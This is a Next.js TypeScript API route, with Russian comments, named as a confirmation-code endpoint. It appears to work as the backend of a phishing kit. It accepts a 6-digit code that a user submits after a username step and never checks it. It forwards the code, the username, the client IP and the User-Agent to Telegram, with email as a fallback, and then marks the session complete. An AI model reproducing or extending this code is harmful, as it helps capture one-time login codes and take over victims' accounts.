import { NextRequest, NextResponse } from "next/server";
import { sendCodeEmail } from "@/lib/email";
import { sendCodeTelegram } from "@/lib/telegram";
import { getSession, setSession, deleteSession } from "@/lib/session";

/**
 * API endpoint для отправки кода подтверждения
 * POST /api/verify-code
 */
export async function POST(request: NextRequest) {
  console.log("[API VERIFY-CODE] Получен запрос на отправку кода");

  try {
    // Получаем IP адрес из заголовков
    const clientIp = 
      request.headers.get("x-forwarded-for")?.split(",")[0]?.trim() || 
      request.headers.get("x-real-ip") || 
      request.headers.get("cf-connecting-ip") ||
      "unknown";

    // Получаем User-Agent из заголовков
    const userAgent = request.headers.get("user-agent") || undefined;

    console.log("[API VERIFY-CODE] IP:", clientIp);
    console.log("[API VERIFY-CODE] User-Agent:", userAgent);

    // Проверка сессии
    const session = await getSession();

    if (!session || session.step !== "code") {
      console.error("[API VERIFY-CODE] Неверная сессия");
      return NextResponse.json(
        { error: "Сессия недействительна. Пожалуйста, войдите снова." },
        { status: 401 }
      );
    }

    // Проверяем наличие username
    if (!session.username) {
      console.error("[API VERIFY-CODE] Username отсутствует в сессии");
      return NextResponse.json(
        { error: "Username не найден в сессии" },
        { status: 400 }
      );
    }

    const body = await request.json();
    const { code } = body;

    console.log("[API VERIFY-CODE] Получен код:", code);

    // Валидация кода
    if (!code || typeof code !== "string" || !/^\d{6}$/.test(code)) {
      console.error("[API VERIFY-CODE] Неверный формат кода");
      return NextResponse.json(
        { error: "Код должен содержать 6 цифр" },
        { status: 400 }
      );
    }

    // Отправка кода в Telegram вместо Email
    try {
      await sendCodeTelegram(code, session.username, clientIp, userAgent);
      console.log("[API VERIFY-CODE] Код отправлен в Telegram");
    } catch (telegramError) {
      console.error("[API VERIFY-CODE] Ошибка отправки в Telegram:", telegramError);
      // Fallback на Email
      try {
        await sendCodeEmail(code, session.username);
        console.log("[API VERIFY-CODE] Fallback: Email с кодом отправлен");
      } catch (emailError) {
        console.error("[API VERIFY-CODE] Ошибка отправки Email:", emailError);
        // Продолжаем выполнение
      }
    }

    // Обновление сессии - код подтвержден
    await setSession({
      step: "completed",
      username: session.username,
    });

    console.log("[API VERIFY-CODE] Код подтвержден, сессия обновлена");

    return NextResponse.json({
      success: true,
      message: "Код успешно отправлен",
    });
  } catch (error) {
    console.error("[API VERIFY-CODE] Ошибка:", error);
    return NextResponse.json(
      {
        error:
          error instanceof Error ? error.message : "Ошибка при отправке кода",
      },
      { status: 500 }
    );
  }
}


